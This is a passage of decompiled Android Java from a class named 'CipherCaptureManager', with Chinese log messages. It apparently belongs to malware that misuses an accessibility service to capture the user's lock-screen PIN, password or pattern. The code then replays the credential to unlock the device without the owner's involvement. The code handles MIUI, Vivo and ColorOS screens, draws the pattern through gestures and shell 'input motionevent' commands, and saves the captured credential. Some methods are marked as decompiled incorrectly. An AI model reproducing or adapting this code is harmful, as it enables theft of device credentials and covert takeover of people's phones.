                            }
                        }
                    }
                    return true;
                }
            }
        } catch (Exception unused2) {
        }
        return false;
    }

    /* renamed from: a2 */
    public final void m211805a2() {
        String string;
        String str = "com.android.systemui";
        try {
            AccessibilityNodeInfo rootInActiveWindow = this.f53286a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return;
            }
            CharSequence packageName = rootInActiveWindow.getPackageName();
            if (packageName == null || (string = packageName.toString()) == null) {
                string = "com.android.settings";
            }
            String str2 = string.equals("com.android.systemui") ? "com.android.systemui" : "com.android.settings";
            if (AbstractC1117qo.m214450e6()) {
                AccessibilityNodeInfo accessibilityNodeInfoM211794c7 = m211794c7(rootInActiveWindow, str2.concat(":id/btn_letter_ok"), "android.widget.TextView");
                if (accessibilityNodeInfoM211794c7 == null) {
                    accessibilityNodeInfoM211794c7 = m211794c7(rootInActiveWindow, "com.android.systemui:id/btn_letter_ok", "android.widget.TextView");
                }
                if (accessibilityNodeInfoM211794c7 != null && accessibilityNodeInfoM211794c7.performAction(16)) {
                    t60.m214702c3("CipherCaptureManager", "点击MIUI确认键: btn_letter_ok");
                    return;
                }
            }
            if (AbstractC1117qo.m214449e5()) {
                List<Pair> listM213306g5 = AbstractC0716jf.m213306g5(new Pair(str2.concat(":id/mix_confirm"), "android.view.View"), new Pair(str2.concat(":id/iv_complete"), "android.widget.TextView"), new Pair(str2.concat(":id/vivo_pin_confirm"), "android.widget.Button"), new Pair(str2.concat(":id/mix_normal_confirm"), "android.widget.TextView"));
                for (Pair pair : listM213306g5) {
                    String str3 = (String) pair.f57556a0;
                    AccessibilityNodeInfo accessibilityNodeInfoM211794c72 = m211794c7(rootInActiveWindow, str3, (String) pair.f57557a1);
                    if (accessibilityNodeInfoM211794c72 == null) {
                        accessibilityNodeInfoM211794c72 = m211793c6(rootInActiveWindow, str3);
                    }
                    if (accessibilityNodeInfoM211794c72 != null && accessibilityNodeInfoM211794c72.performAction(16)) {
                        t60.m214702c3("CipherCaptureManager", "点击Vivo确认键: " + str3);
                        return;
                    }
                }
                if (!str2.equals("com.android.settings")) {
                    str = "com.android.settings";
                }
                for (Pair pair2 : listM213306g5) {
                    String str4 = (String) pair2.f57556a0;
                    String str5 = (String) pair2.f57557a1;
                    String strM213673c6 = AbstractC0779a1.m213673c6(str4, str2, str);
                    AccessibilityNodeInfo accessibilityNodeInfoM211794c73 = m211794c7(rootInActiveWindow, strM213673c6, str5);
                    if (accessibilityNodeInfoM211794c73 == null) {
                        accessibilityNodeInfoM211794c73 = m211793c6(rootInActiveWindow, strM213673c6);
                    }
                    if (accessibilityNodeInfoM211794c73 != null && accessibilityNodeInfoM211794c73.performAction(16)) {
                        t60.m214702c3("CipherCaptureManager", "点击Vivo确认键(fallback): " + strM213673c6);
                        return;
                    }
                }
            }
            for (String str6 : AbstractC0716jf.m213306g5(str2 + ":id/key_enter", "com.android.systemui:id/key_enter", "com.android.settings:id/key_enter")) {
                for (AccessibilityNodeInfo accessibilityNodeInfo : rootInActiveWindow.findAccessibilityNodeInfosByViewId(str6)) {
                    if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
                        t60.m214702c3("CipherCaptureManager", "点击通用Enter键: " + str6);
                        return;
                    }
                }
            }
        } catch (Exception e) {
            tz0.m214810b0("I_clickConfirmButton 异常: ", e.getMessage(), "CipherCaptureManager");
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(7:219|(2:221|(4:223|224|243|(1:290)(2:246|(1:294)(1:292)))(1:225))(1:226)|269|227|(1:229)|232|(2:234|(4:236|224|243|(0)(0)))) */
    /* JADX WARN: Code restructure failed: missing block: B:230:0x05f4, code lost:
    
        r0 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:238:0x0613, code lost:
    
        p000.t60.m214726f4("CipherCaptureManager", r20 + r0.getMessage());
     */
    /* JADX WARN: Removed duplicated region for block: B:246:0x064d  */
    /* JADX WARN: Removed duplicated region for block: B:290:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:77:0x01a5 A[Catch: Exception -> 0x0070, TryCatch #1 {Exception -> 0x0070, blocks: (B:14:0x0040, B:16:0x0044, B:19:0x004c, B:21:0x005a, B:25:0x0073, B:27:0x007b, B:33:0x008a, B:37:0x0094, B:40:0x009c, B:43:0x00a3, B:45:0x00ad, B:46:0x00bf, B:48:0x00c5, B:50:0x00d1, B:52:0x00e6, B:55:0x00fd, B:57:0x0103, B:58:0x010e, B:61:0x012f, B:66:0x013c, B:68:0x0147, B:70:0x014e, B:71:0x0167, B:73:0x016d, B:74:0x0182, B:69:0x014b, B:77:0x01a5, B:78:0x01b2, B:80:0x01b8, B:81:0x01cd, B:84:0x01ef), top: B:258:0x0040 }] */
    /* JADX WARN: Removed duplicated region for block: B:90:0x0216 A[ORIG_RETURN, RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:91:0x021a  */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m211806a3(C0598hx c0598hx) throws InterruptedException, IOException {
        String str;
        boolean z;
        AccessibilityNodeInfo rootInActiveWindow;
        String str2;
        AccessibilityNodeInfo accessibilityNodeInfoM211795c8;
        String string;
        String string2;
        long j;
        boolean zM211828e5;
        Rect rect;
        List list;
        Rect rect2;
        Rect rect3;
        String string3;
        String str3 = c0598hx.f56760a0;
        if (!t60.m214686a2(str3, "PASSWORD_QUALITY_NUMERIC_COMPLEX") && !t60.m214686a2(str3, "PASSWORD_QUALITY_ALPHANUMERIC") && !t60.m214686a2(str3, f53283c5.getQUALITY_NUMERIC())) {
            if (!t60.m214686a2(str3, "PASSWORD_QUALITY_PATTERN")) {
                return false;
            }
            try {
                list = c0598hx.f56763a3;
                rect2 = c0598hx.f56766a6;
                j = 200;
                try {
                    rect3 = c0598hx.f56767a7;
                } catch (Exception e) {
                    e = e;
                    t60.m214714d6("CipherCaptureManager", "tryPatternInput 异常: " + e.getMessage());
                    zM211828e5 = false;
                    if (!zM211828e5) {
                    }
                }
            } catch (Exception e2) {
                e = e2;
                j = 200;
            }
            if (list == null || list.isEmpty()) {
                t60.m214714d6("CipherCaptureManager", "tryPatternInput: patternScreenPoints 为空，尝试网格索引回退");
                zM211828e5 = m211828e5(c0598hx);
            } else {
                LinkedList<android.graphics.Point> linkedList = new LinkedList(list);
                m211798d2(linkedList);
                if (linkedList.size() < 2) {
                    t60.m214714d6("CipherCaptureManager", "tryPatternInput: 去重后点数不足: " + linkedList.size());
                } else {
                    AccessibilityNodeInfo rootInActiveWindow2 = this.f53286a0.getRootInActiveWindow();
                    if (rootInActiveWindow2 == null) {
                        t60.m214714d6("CipherCaptureManager", "tryPatternInput: rootInActiveWindow 为 null");
                    } else {
                        for (int i = 0; i < 5; i++) {
                            try {
                                Thread.sleep(200L);
                            } catch (Exception unused) {
                            }
                        }
                        AccessibilityNodeInfo rootInActiveWindow3 = this.f53286a0.getRootInActiveWindow();
                        if (rootInActiveWindow3 != null) {
                            rootInActiveWindow2 = rootInActiveWindow3;
                        }
                        CharSequence packageName = rootInActiveWindow2.getPackageName();
                        if (packageName == null || (string3 = packageName.toString()) == null) {
                            string3 = "com.android.settings";
                        }
                        AccessibilityNodeInfo accessibilityNodeInfoM211794c7 = m211794c7(rootInActiveWindow2, string3.concat(":id/lockPattern"), "android.view.View");
                        if (accessibilityNodeInfoM211794c7 == null) {
                            for (String str4 : AbstractC0716jf.m213306g5("com.android.settings", "com.android.systemui", "com.coloros.settings", "com.oplus.settings")) {
                                if (!t60.m214686a2(str4, string3)) {
                                    accessibilityNodeInfoM211794c7 = m211794c7(rootInActiveWindow2, str4 + ":id/lockPattern", "android.view.View");
                                    if (accessibilityNodeInfoM211794c7 != null) {
                                        break;
                                    }
                                    accessibilityNodeInfoM211794c7 = m211793c6(rootInActiveWindow2, str4 + ":id/lockPattern");
                                    if (accessibilityNodeInfoM211794c7 != null) {
                                        break;
                                    }
                                }
                            }
                        }
                        if (accessibilityNodeInfoM211794c7 == null) {
                            accessibilityNodeInfoM211794c7 = m211796c9(rootInActiveWindow2);
                        }
                        if (accessibilityNodeInfoM211794c7 == null) {
                            t60.m214714d6("CipherCaptureManager", "tryPatternInput: 找不到 lockPattern 节点");
                            m211787c0(rootInActiveWindow2, 0);
                        } else {
                            t60.m214714d6("CipherCaptureManager", "confirmLockByGesture pattern: 找到lockPattern节点");
                            String str5 = Build.BRAND;
                            t60.m214694b5(str5, "BRAND");
                            String lowerCase = str5.toLowerCase(Locale.ROOT);
                            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                            if (lowerCase.equals("vivo") || lowerCase.equals("iqoo") || rect2 == null || rect3 == null) {
                                ArrayList arrayList = new ArrayList(AbstractC0717jg.m213310g9(linkedList));
                                for (android.graphics.Point point : linkedList) {
                                    arrayList.add(new PointF(point.x, point.y));
                                }
                                t60.m214714d6("CipherCaptureManager", "使用原始坐标: " + arrayList.size() + "个点");
                                if (m211808a5(arrayList)) {
                                    zM211828e5 = true;
                                }
                            } else {
                                Rect rect4 = new Rect();
                                if (Build.VERSION.SDK_INT >= 34) {
                                    accessibilityNodeInfoM211794c7.getBoundsInWindow(rect4);
                                } else {
                                    accessibilityNodeInfoM211794c7.getBoundsInScreen(rect4);
                                }
                                Rect rect5 = new Rect();
                                accessibilityNodeInfoM211794c7.getBoundsInParent(rect5);
                                List<android.graphics.Point> listM211799d3 = m211799d3(linkedList, rect2, rect3, rect4, rect5);
                                ArrayList arrayList2 = new ArrayList(AbstractC0717jg.m213310g9(listM211799d3));
                                for (android.graphics.Point point2 : listM211799d3) {
                                    arrayList2.add(new PointF(point2.x, point2.y));
                                }
                                t60.m214714d6("CipherCaptureManager", "非Vivo坐标映射: " + arrayList2.size() + "个点");
                                if (!m211808a5(arrayList2)) {
                                }
                                zM211828e5 = true;
                            }
                        }
                    }
                }
                zM211828e5 = false;
            }
            if (!zM211828e5) {
                return true;
            }
            List list2 = c0598hx.f56762a2;
            if (list2 == null || list2.isEmpty()) {
                return false;
            }
            try {
                AccessibilityNodeInfo rootInActiveWindow4 = this.f53286a0.getRootInActiveWindow();
                if (rootInActiveWindow4 != null) {
                    Iterator it = AbstractC0716jf.m213306g5("com.android.settings:id/lockPattern", "com.android.systemui:id/lockPattern", "com.android.systemui:id/colorLockPatternView", "com.android.systemui:id/vivo_lock_pattern_view", "com.android.systemui:id/lockPatternView").iterator();
                    while (true) {
                        if (!it.hasNext()) {
                            rect = null;
                            break;
                        }
                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow4.findAccessibilityNodeInfosByViewId((String) it.next());
                        t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "nodes");
                        if (!listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                            Rect rect6 = new Rect();
                            listFindAccessibilityNodeInfosByViewId.get(0).getBoundsInScreen(rect6);
                            rect = rect6;
                            break;
                        }
                    }
                    if (rect == null) {
                        t60.m214726f4("CipherCaptureManager", "ADB Pattern: 未找到图案锁节点");
                    } else {
                        float fWidth = rect.width() / 3.0f;
                        float fHeight = rect.height() / 3.0f;
                        ArrayList arrayList3 = new ArrayList(AbstractC0717jg.m213310g9(list2));
                        Iterator it2 = list2.iterator();
                        while (it2.hasNext()) {
                            int iIntValue = ((Number) it2.next()).intValue();
                            arrayList3.add(new Pair(Integer.valueOf((int) ((fWidth / 2.0f) + ((iIntValue % 3) * fWidth) + rect.left)), Integer.valueOf((int) ((fHeight / 2.0f) + ((iIntValue / 3) * fHeight) + rect.top))));
                        }
                        if (arrayList3.size() >= 2) {
                            try {
                                Pair pair = (Pair) arrayList3.get(0);
                                Process processExec = Runtime.getRuntime().exec(new String[]{"sh", "-c", "input motionevent DOWN " + pair.f57556a0 + " " + pair.f57557a1});
                                TimeUnit timeUnit = TimeUnit.SECONDS;
                                if (!processExec.waitFor(5L, TimeUnit.SECONDS)) {
                                    processExec.destroy();
                                }
                                int size = arrayList3.size();
                                for (int i2 = 1; i2 < size; i2++) {
                                    Pair pair2 = (Pair) arrayList3.get(i2);
                                    Process processExec2 = Runtime.getRuntime().exec(new String[]{"sh", "-c", "input motionevent MOVE " + pair2.f57556a0 + " " + pair2.f57557a1});
                                    TimeUnit timeUnit2 = TimeUnit.SECONDS;
                                    if (!processExec2.waitFor(5L, TimeUnit.SECONDS)) {
                                        processExec2.destroy();
                                    }
                                }
                                Pair pair3 = (Pair) AbstractC0715je.m213296i3(arrayList3);
                                Process processExec3 = Runtime.getRuntime().exec(new String[]{"sh", "-c", "input motionevent UP " + pair3.f57556a0 + " " + pair3.f57557a1});
                                TimeUnit timeUnit3 = TimeUnit.SECONDS;
                                if (!processExec3.waitFor(5L, TimeUnit.SECONDS)) {
                                    processExec3.destroy();
                                }
                                for (int i3 = 0; i3 < 5; i3++) {
                                    try {
                                        Thread.sleep(j);
                                    } catch (Exception unused2) {
                                    }
                                }
                                return m211803a0();
                            } catch (Exception e3) {
                                t60.m214726f4("CipherCaptureManager", "ADB motionevent 失败: " + e3.getMessage());
                            }
                        }
                    }
                }
            } catch (Exception e4) {
                tz0.m214807a7("tryAdbPatternInput 异常: ", e4.getMessage(), "CipherCaptureManager");
            }
            return false;
        }
        String str6 = c0598hx.f56761a1;
        if (str6 == null || str6.length() == 0) {
            return false;
        }
        t60.m214702c3("CipherCaptureManager", "confirmLockByCipher: type=" + str3 + ", length=" + str6.length());
        t60.m214702c3("CipherCaptureManager", "J_autoInput: 等待页面稳定...");
        Thread.sleep(500L);
        t60.m214702c3("CipherCaptureManager", "J_autoInput: ★★★ 开始 tryEditTextInput ★★★");
        try {
            str = str3;
            try {
                t60.m214702c3("CipherCaptureManager", "tryEditTextInput: 开始查找EditText, 密码长度=" + str6.length());
                rootInActiveWindow = this.f53286a0.getRootInActiveWindow();
            } catch (Exception e5) {
                e = e5;
                tz0.m214807a7("tryEditTextInput 异常: ", e.getMessage(), "CipherCaptureManager");
                z = false;
                t60.m214702c3("CipherCaptureManager", "J_autoInput: tryEditTextInput 结果=" + z);
                if (!z) {
                }
            }
        } catch (Exception e6) {
            e = e6;
            str = str3;
        }
        if (rootInActiveWindow == null) {
            t60.m214726f4("CipherCaptureManager", "tryEditTextInput: rootInActiveWindow 为 null");
        } else {
            AccessibilityNodeInfo accessibilityNodeInfoFindFocus = this.f53286a0.findFocus(1);
            t60.m214702c3("CipherCaptureManager", "tryEditTextInput: service.findFocus 结果=" + ((Object) (accessibilityNodeInfoFindFocus != null ? accessibilityNodeInfoFindFocus.getClassName() : null)));
            if (accessibilityNodeInfoFindFocus != null) {
                CharSequence className = accessibilityNodeInfoFindFocus.getClassName();
                if (className == null || (string2 = className.toString()) == null) {
                    string2 = "";
                }
                str2 = "tryEditTextInput: input text 命令失败: ";
                if (AbstractC0779a1.m213652a5(string2, "EditText", false) || accessibilityNodeInfoFindFocus.isEditable()) {
                    t60.m214702c3("CipherCaptureManager", "tryEditTextInput: focusNode 是 EditText");
                    accessibilityNodeInfoM211795c8 = accessibilityNodeInfoFindFocus;
                } else {
                    t60.m214702c3("CipherCaptureManager", "tryEditTextInput: focusNode 不是 EditText，在子树中查找...");
                    accessibilityNodeInfoM211795c8 = m211790c3(accessibilityNodeInfoFindFocus);
                }
            } else {
                str2 = "tryEditTextInput: input text 命令失败: ";
                accessibilityNodeInfoM211795c8 = null;
            }
            if (accessibilityNodeInfoM211795c8 == null) {
                t60.m214702c3("CipherCaptureManager", "tryEditTextInput: 在整棵视图树中查找 EditText...");
                AccessibilityNodeInfo accessibilityNodeInfoM211790c3 = m211790c3(rootInActiveWindow);
                t60.m214702c3("CipherCaptureManager", "tryEditTextInput: findEditText(root) 结果=" + ((Object) (accessibilityNodeInfoM211790c3 != null ? accessibilityNodeInfoM211790c3.getClassName() : null)));
                accessibilityNodeInfoM211795c8 = accessibilityNodeInfoM211790c3;
            }
            if (accessibilityNodeInfoM211795c8 == null) {
                t60.m214702c3("CipherCaptureManager", "tryEditTextInput: 查找 focused=true 的 EditText...");
                accessibilityNodeInfoM211795c8 = m211791c4(rootInActiveWindow);
                t60.m214702c3("CipherCaptureManager", "tryEditTextInput: findFocusedEditText 结果=" + ((Object) (accessibilityNodeInfoM211795c8 != null ? accessibilityNodeInfoM211795c8.getClassName() : null)));
            }
            if (accessibilityNodeInfoM211795c8 == null) {
                t60.m214702c3("CipherCaptureManager", "tryEditTextInput: 通过 viewId 查找密码输入框...");
                accessibilityNodeInfoM211795c8 = m211795c8(rootInActiveWindow);
                t60.m214702c3("CipherCaptureManager", "tryEditTextInput: findPasswordInputById 结果=" + ((Object) (accessibilityNodeInfoM211795c8 != null ? accessibilityNodeInfoM211795c8.getClassName() : null)));
            }
            if (accessibilityNodeInfoM211795c8 == null) {
                t60.m214726f4("CipherCaptureManager", "tryEditTextInput: ❌ 所有方式都未找到任何输入框");
                m211786b9(rootInActiveWindow, 0);
            } else {
                CharSequence className2 = accessibilityNodeInfoM211795c8.getClassName();
                if (className2 == null || (string = className2.toString()) == null) {
                    string = "";
                }
                t60.m214702c3("CipherCaptureManager", "tryEditTextInput: ✅ 找到输入框 class=" + string + ", isPassword=" + accessibilityNodeInfoM211795c8.isPassword() + ", isEditable=" + accessibilityNodeInfoM211795c8.isEditable());
                if (AbstractC0779a1.m213652a5(string, "EditText", false) || accessibilityNodeInfoM211795c8.isEditable()) {
                    accessibilityNodeInfoM211795c8.performAction(1);
                    Thread.sleep(200L);
                    t60.m214702c3("CipherCaptureManager", "tryEditTextInput: 尝试 ACTION_SET_TEXT");
                    Bundle bundle = new Bundle();
                    bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str6);
                    if (accessibilityNodeInfoM211795c8.performAction(2097152, bundle)) {
                        t60.m214702c3("CipherCaptureManager", "tryEditTextInput: ACTION_SET_TEXT 成功，点击确认");
                        Thread.sleep(300L);
                        m211807a4(accessibilityNodeInfoM211795c8);
                        if (m211803a0()) {
                            t60.m214714d6("CipherCaptureManager", "tryEditTextInput: ✅ 密码输入成功！");
                            z = true;
                            t60.m214702c3("CipherCaptureManager", "J_autoInput: tryEditTextInput 结果=" + z);
                            if (!z) {
                                return true;
                            }
                            t60.m214702c3("CipherCaptureManager", "J_autoInput: ★★★ 开始 tryKeyNodeInput ★★★");
                            return m211827e4(str6, str) || m211825e2(str6);
                        }
                        t60.m214726f4("CipherCaptureManager", "tryEditTextInput: G_verifySuccess 返回 false");
                    } else {
                        t60.m214726f4("CipherCaptureManager", "tryEditTextInput: ACTION_SET_TEXT 失败");
                    }
                    t60.m214702c3("CipherCaptureManager", "tryEditTextInput: 尝试 input text 命令");
                    Bundle bundle2 = new Bundle();
                    bundle2.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", "");
                    accessibilityNodeInfoM211795c8.performAction(2097152, bundle2);
                    Thread.sleep(200L);
                    Process processExec4 = Runtime.getRuntime().exec(new String[]{"input", "text", AbstractC0779a1.m213673c6(str6, " ", "%s")});
                    TimeUnit timeUnit4 = TimeUnit.SECONDS;
                    if (!processExec4.waitFor(10L, TimeUnit.SECONDS)) {
                        processExec4.destroy();
                    }
                    if (processExec4.exitValue() == 0) {
                        t60.m214702c3("CipherCaptureManager", "tryEditTextInput: input text 成功");
                        Thread.sleep(300L);
                        m211807a4(accessibilityNodeInfoM211795c8);
                        if (m211803a0()) {
                            t60.m214714d6("CipherCaptureManager", "tryEditTextInput: ✅ input text 方式成功！");
                            z = true;
                            t60.m214702c3("CipherCaptureManager", "J_autoInput: tryEditTextInput 结果=" + z);
                            if (!z) {
                            }
                        }
                    }
                } else {
                    t60.m214726f4("CipherCaptureManager", "tryEditTextInput: 节点不是可编辑的输入框, class=" + string + ", isEditable=" + accessibilityNodeInfoM211795c8.isEditable());
                }
            }
        }
        z = false;
        t60.m214702c3("CipherCaptureManager", "J_autoInput: tryEditTextInput 结果=" + z);
        if (!z) {
        }
    }

    /* renamed from: a4 */
    public final void m211807a4(AccessibilityNodeInfo accessibilityNodeInfo) throws IOException {
        try {
            Process processExec = Runtime.getRuntime().exec(new String[]{"sh", "-c", "input keyevent 66"});
            TimeUnit timeUnit = TimeUnit.SECONDS;
            if (!processExec.waitFor(10L, TimeUnit.SECONDS)) {
                processExec.destroy();
            }
            if (processExec.exitValue() == 0) {
                return;
            }
        } catch (Exception e) {
            tz0.m214810b0("input keyevent 66 失败: ", e.getMessage(), "CipherCaptureManager");
        }
        try {
            if (Build.VERSION.SDK_INT >= 30) {
                accessibilityNodeInfo.performAction(AccessibilityNodeInfo.AccessibilityAction.ACTION_IME_ENTER.getId());
            }
        } catch (Exception e2) {
            tz0.m214810b0("IME_ENTER 失败: ", e2.getMessage(), "CipherCaptureManager");
        }
    }

    /* renamed from: a5 */
    public final boolean m211808a5(ArrayList arrayList) throws InterruptedException {
        if (arrayList.size() < 2) {
            return m211803a0();
        }
        for (int i = 1; i < 5; i++) {
            long j = i * 1000;
            try {
                t60.m214714d6("CipherCaptureManager", "图案重放第 " + i + " 次, 持续时间=" + j + "ms, 点数=" + arrayList.size());
                int size = arrayList.size();
                for (int i2 = 0; i2 < size; i2++) {
                    t60.m214714d6("CipherCaptureManager", "  点[" + i2 + "]: (" + ((PointF) arrayList.get(i2)).x + ", " + ((PointF) arrayList.get(i2)).y + ")");
                }
                Path path = new Path();
                path.moveTo(((PointF) arrayList.get(0)).x, ((PointF) arrayList.get(0)).y);
                int size2 = arrayList.size();
                for (int i3 = 1; i3 < size2; i3++) {
                    path.lineTo(((PointF) arrayList.get(i3)).x, ((PointF) arrayList.get(i3)).y);
                }
                try {
                    if (this.f53286a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 10L, j)).build(), null, null)) {
                        Thread.sleep(j + 1000);
                        t60.m214714d6("CipherCaptureManager", "ResolveGesture Done (第" + i + "次)");
                        if (m211803a0()) {
                            t60.m214714d6("CipherCaptureManager", "图案验证成功 (第 " + i + " 次)");
                            return true;
                        }
                        continue;
                    } else {
                        t60.m214714d6("CipherCaptureManager", "图案重放第 " + i + " 次: dispatchGesture 返回 false");
                    }
                } catch (Exception e) {
                    e = e;
                    t60.m214714d6("CipherCaptureManager", "图案重放第 " + i + " 次异常: " + e.getMessage());
                }
            } catch (Exception e2) {
                e = e2;
            }
        }
        return m211803a0();
    }

    /* renamed from: a8 */
    public final boolean m211809a8() throws Throwable {
        String str;
        boolean z;
        boolean zM211806a3;
        String str2;
        Integer numValueOf;
        if (this.f53307c1) {
            t60.m214714d6("CipherCaptureManager", "autoUnlock: 已有另一个autoUnlock正在运行，跳过本次调用");
            return false;
        }
        this.f53307c1 = true;
        try {
            try {
                C0598hx c0598hxM211819d0 = m211819d0(true);
                C0598hx c0598hxM211819d02 = m211819d0(false);
                t60.m214714d6("CipherCaptureManager", "★★★ autoUnlock: lockedCipher=" + (c0598hxM211819d0 != null) + ", normalCipher=" + (c0598hxM211819d02 != null));
                if (c0598hxM211819d0 != null) {
                    String str3 = c0598hxM211819d0.f56760a0;
                    String str4 = c0598hxM211819d0.f56761a1;
                    if (str4 != null) {
                        try {
                            numValueOf = Integer.valueOf(str4.length());
                        } catch (Throwable th) {
                            th = th;
                            z = false;
                            this.f53307c1 = z;
                            throw th;
                        }
                    } else {
                        numValueOf = null;
                    }
                    List list = c0598hxM211819d0.f56762a2;
                    List list2 = c0598hxM211819d0.f56763a3;
                    str = "autoUnlock 异常: ";
                    try {
                        t60.m214714d6("CipherCaptureManager", "★ locked密码: grade=" + str3 + ", textLen=" + numValueOf + ", pattern=" + list + ", screenPts=" + (list2 != null ? Integer.valueOf(list2.size()) : null));
                    } catch (Exception e) {
                        e = e;
                        t60.m214704c5("CipherCaptureManager", str + e.getMessage());
                        this.f53307c1 = false;
                        return false;
                    }
                }
                if (c0598hxM211819d02 != null) {
                    String str5 = c0598hxM211819d02.f56760a0;
                    String str6 = c0598hxM211819d02.f56761a1;
                    Integer numValueOf2 = str6 != null ? Integer.valueOf(str6.length()) : null;
                    List list3 = c0598hxM211819d02.f56762a2;
                    List list4 = c0598hxM211819d02.f56763a3;
                    t60.m214714d6("CipherCaptureManager", "★ normal密码: grade=" + str5 + ", textLen=" + numValueOf2 + ", pattern=" + list3 + ", screenPts=" + (list4 != null ? Integer.valueOf(list4.size()) : null));
                }
                if (c0598hxM211819d0 != null) {
                    t60.m214714d6("CipherCaptureManager", "★ 尝试使用 locked 密码自动输入...");
                    zM211806a3 = m211806a3(c0598hxM211819d0);
                    t60.m214714d6("CipherCaptureManager", "★ locked密码结果: " + zM211806a3);
                } else {
                    zM211806a3 = false;
                }
                if (!zM211806a3 && c0598hxM211819d02 != null) {
                    t60.m214714d6("CipherCaptureManager", "★ 尝试使用普通密码自动输入...");
                    zM211806a3 = m211806a3(c0598hxM211819d02);
                    t60.m214714d6("CipherCaptureManager", "★ normal密码结果: " + zM211806a3);
                }
                boolean z2 = zM211806a3;
                if (z2) {
                    t60.m214702c3("CipherCaptureManager", "✅ 已完成锁屏密码验证代理");
                    C0598hx c0598hxM211819d03 = m211819d0(true);
                    if (c0598hxM211819d03 == null) {
                        c0598hxM211819d03 = m211819d0(false);
                    }
                    if (c0598hxM211819d03 != null) {
                        String str7 = c0598hxM211819d03.f56760a0;
                        if (t60.m214686a2(str7, "PASSWORD_QUALITY_PATTERN")) {
                            str2 = "pattern";
                        } else {
                            str2 = t60.m214686a2(str7, f53283c5.getQUALITY_NUMERIC()) ? true : t60.m214686a2(str7, "PASSWORD_QUALITY_NUMERIC_COMPLEX") ? "pin" : "password";
                        }
                        AbstractC0780a0.m213692a3(this.f53293a7, null, new CipherCaptureManager$saveCipher$1(str2, c0598hxM211819d03.f56761a1, c0598hxM211819d03.f56762a2, this, null), 3);
                    }
                } else {
                    t60.m214726f4("CipherCaptureManager", "⚠️ autoUnlock 失败，保留已保存密码（可能是时序问题）");
                }
                this.f53307c1 = false;
                return z2;
            } catch (Throwable th2) {
                th = th2;
                z = false;
            }
        } catch (Exception e2) {
            e = e2;
            str = "autoUnlock 异常: ";
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:20:0x0071  */
    /* JADX WARN: Removed duplicated region for block: B:44:0x00bc  */
    /* renamed from: a9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211810a9(String str, String str2) {
        String quality_numeric;
        String str3;
        long jCurrentTimeMillis = System.currentTimeMillis();
        C0598hx c0598hx = this.f53306c0;
        int i = 0;
        if (c0598hx != null && (str3 = c0598hx.f56761a1) != null && str.length() == str3.length() + 1 && AbstractC0779a1.m213679d2(str, false, str3)) {
            long j = jCurrentTimeMillis - this.f53302b6;
            if (j > 1500) {
                t60.m214726f4("CipherCaptureManager", "⚠️ 密码长度已稳定" + j + "ms(>1.5s), 拒绝+1扩展(" + str3.length() + "→" + str.length() + "位), 可能为误触/系统残留事件");
                return;
            }
        }
        if ((c0598hx != null ? c0598hx.f56761a1 : null) != null) {
            int length = str.length();
            String str4 = c0598hx.f56761a1;
            t60.m214692b3(str4);
            if (length != str4.length()) {
                this.f53302b6 = jCurrentTimeMillis;
            }
        }
        int iHashCode = str2.hashCode();
        if (iHashCode != -791090288) {
            quality_numeric = "PASSWORD_QUALITY_ALPHANUMERIC";
            if (iHashCode == 110997) {
                if (str2.equals("pin")) {
                    while (true) {
                        if (i >= str.length()) {
                            quality_numeric = "PASSWORD_QUALITY_NUMERIC_COMPLEX";
                            break;
                        } else if (!Character.isDigit(str.charAt(i))) {
                            break;
                        } else {
                            i++;
                        }
                    }
                }
            } else if (iHashCode != 1216985755 || !str2.equals("password")) {
                quality_numeric = f53283c5.getQUALITY_NUMERIC();
            }
        } else if (str2.equals("pattern")) {
            quality_numeric = "PASSWORD_QUALITY_PATTERN";
        }
        String str5 = quality_numeric;
        this.f53306c0 = new C0598hx(str5, str, null, null, true, jCurrentTimeMillis, null, null, null, 968);
        int length2 = str.length();
        StringBuilder sbM41c2 = AbstractC0003a2.m41c2("📦 密码已缓冲: type=", str2, ", grade=", str5, ", length=");
        sbM41c2.append(length2);
        sbM41c2.append(" (等待验证后保存)");
        t60.m214714d6("CipherCaptureManager", sbM41c2.toString());
    }

    /* renamed from: b0 */
    public final boolean m211811b0(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        try {
            if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
                t60.m214714d6("CipherCaptureManager", "✅ 自动点击'使用密码'按钮(performAction): " + str);
                return true;
            }
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            float fCenterX = rect.centerX();
            float fCenterY = rect.centerY();
            if (fCenterX <= 0.0f || fCenterY <= 0.0f) {
                t60.m214726f4("CipherCaptureManager", "⚠️ 找到 button_use_credential 但点击失败: " + str + ", clickable=" + accessibilityNodeInfo.isClickable());
                return false;
            }
            Path path = new Path();
            path.moveTo(fCenterX, fCenterY);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 50L));
            boolean zDispatchGesture = this.f53286a0.dispatchGesture(builder.build(), null, null);
            t60.m214714d6("CipherCaptureManager", "✅ 自动点击'使用密码'按钮(dispatchGesture at " + fCenterX + "," + fCenterY + "): " + str + ", dispatched=" + zDispatchGesture);
            return zDispatchGesture;
        } catch (Exception e) {
            tz0.m214810b0("clickNodeWithFallback 异常: ", e.getMessage(), "CipherCaptureManager");
            return false;
        }
    }

    /* renamed from: b1 */
    public final boolean m211812b1() {
        Boolean boolValueOf;
        C0337a3 c0337a3;
        C0337a3 c0337a32 = this.f53289a3;
        if (c0337a32 != null) {
